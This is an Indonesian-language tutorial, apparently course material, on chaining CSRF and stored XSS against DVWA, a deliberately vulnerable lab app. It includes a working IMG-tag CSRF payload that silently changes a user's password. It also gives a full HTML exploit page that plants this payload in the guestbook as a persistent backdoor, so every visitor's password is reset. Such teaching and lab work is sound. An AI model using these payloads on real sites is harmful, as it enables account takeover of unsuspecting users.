# Exploit Chain (CSRF + XSS)

Serangan tidak hanya berbicara tentang satu celah yang di eksploitasi. Jika kita menemukan beberapa celah pada aplikasi kita bisa mengkombinasikannya untuk mendapatkan vektor serangan yang beragam.

Sebagai contoh pada pertemuan sebelumnya kita sudah tahu bahwa DVWA memiliki celah sebagai berikut :

## XSS Stored

Sedangkan untuk CSRF hampir semua halaman DVWA tidak mencegah adanya serangan CSRF. Termasuk pada URL [http://vuln.cilsy.id:31333/vulnerabilities/csrf/](http://vuln.cilsy.id:31333/vulnerabilities/csrf/) yang merupakan halaman untuk mengganti password login. Karena tidak ada form untuk validasi password lama tentu ini akan rentan terhadap celah CSRF.

![](https://lh4.googleusercontent.com/XoPudeZhkm4GL8csNZb428xJcrl8OxTYhgKeRX3LTbki5hUhQC0-BdwIn-PgJPmX8ewjetl6no8KxxjMTdOlglUcmMzdIdUZRVNUFOztXZ-Rb3KoGQtu3_S3ybX2vzhgyoySAC4fEI9phmABdltLnaLJ7yI)

Gambar: Penggantian password DVWA yang tertangkap dengan Burp

Dari gambar diatas terlihat jelas bahwa HTTP request hanya menggunakan method GET. Artinya cukup menggunakan tag IMG kita sudah bisa mengeksploitasinya.Â  Berikut contoh CSRF exploit yang sesuai dengan gambar diatas :

```html
<img src="http://vuln.cilsy.id:31333/vulnerabilities/csrf/?password_new=password123&password_conf=password123&Change=Change"/>
```

Ketika user memuat element IMG diatas web browser akan mengakses URL tersebut. Dan ternyata URL tersebut untuk mengganti password. Alhasil pengguna meminta password baru tanpa dia sadari.

## **Proof Of Concept**

Nah pada materi diatas kita sudah bisa menemukan kerentanan CSRF pada DVWA selanjutnya kita akan menggunakan attack chain untuk mengkombinasikan XSS dan CSRF. Berikut konsep serangan yang akan kita lakukan :

- Penyerang tidak memiliki akses langsung ke dalam DVWA
- Untuk mendapatkan akses, penyerang harus mengeksploitasi CSRF untuk mengganti password dan memanfaatkan XSS
- Untuk secara langsung menanamkan backdoor XSS, pada halaman exploit CSRF tidak hanya mengganti password tapi juga mengirimkan XSS payload sebagai backdoor ke halaman guestbook
- Pada nomor 3 backdoor payload XSS yang diberikan merupakan exploit CSRF untuk mengganti password
- Sehingga diharapkan ketika user berhasil mengatur password ulang untuk mengembalikan akses dari penyerang, setiap user membuka guestbook maka password akan diganti sehingga penyerang bisa mendapatkan akses login kembali.

Dari konsep serangan diatas berikut exploitnya :

```html
<html>

<head>
  <title>GuestBook Exploit</title>
</head>

<body>
  <iframe style="display:none" name="csrf-frame"></iframe>
  <form id="idForm" action="http://vuln.cilsy.id:31333/vulnerabilities/xss_s/" target="csrf-frame" method="POST">
  	<input type="hidden" name="txtName" value="XSS Backdoor" />
  	<input type="hidden" name="mtxMessage" value="CSRF Exploit" />
  	<input type="hidden" name="btnSign" value="Sign Guestbook" />
  	<input type="submit" style="visibility:hidden" />
  </form>
  <script>
  	var csrf_set_password = '<img src="http://vuln.cilsy.id:31333/vulnerabilities/csrf/?password_new=password123&password_conf=password123&Change=Change"/>';
  	document.getElementsByName("mtxMessage")[0].value = csrf_set_password;
  	document.getElementById("idForm").submit();
  	document.write(csrf_set_password);
  	alert("Exploit sudah selesai dijalankan!")
  </script>
</body>
```